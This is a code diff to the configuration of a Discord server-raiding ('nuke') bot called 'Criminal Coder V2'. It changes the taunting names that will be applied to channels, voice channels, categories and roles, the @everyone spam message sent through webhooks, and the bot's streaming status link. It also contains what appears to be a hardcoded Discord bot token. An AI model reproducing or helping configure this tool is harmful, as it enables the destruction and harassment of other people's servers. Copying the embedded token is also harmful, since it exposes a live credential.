@@ -22,11 +22,11 @@ os.system(f'cls & title [Criminal Coder V2] - Configuration')
 
 token="OTgxODUwMDQ2NTE1NTE5NTI4.Gd8Y-S.ei1qAQKlfs27BqtWj1b07LzndCLJ07IU"
 prefix = ">"
-CHANNEL_NAMES = "WIZZED BY Criminal"
-VCHANNELS_NAMES = "SEIZED BY Criminal"
-CATEGORY_NAMES = "Criminal Owns You"
-ROLE_NAMES = "Criminal On Top"
-Webhook_contents = "@everyone | @here NUTS! CRIMINAL IS HERE!"
+CHANNEL_NAMES = "HALA NA NUKE??"
+VCHANNELS_NAMES = "HALA NA NUKE??"
+CATEGORY_NAMES = "HALA NA NUKE??"
+ROLE_NAMES = "HAHAHAHA"
+Webhook_contents = "@everyone | @here your server is ass"
 
 
 os.system('cls')
@@ -78,8 +78,8 @@ logging.basicConfig(
 @client.event
 async def on_ready():
     await client.change_presence(activity=discord.Streaming(
-        name='CRIMINAL CODER ON TOP!',
-        url='https://youtube.com/channel/UCKVtvqg4wt6e5jfqSKoTHQA'))
+        name='HALA NANUKE?',
+        url='https://discord.gg/J6nmdTPnU'))
 
 
     print(
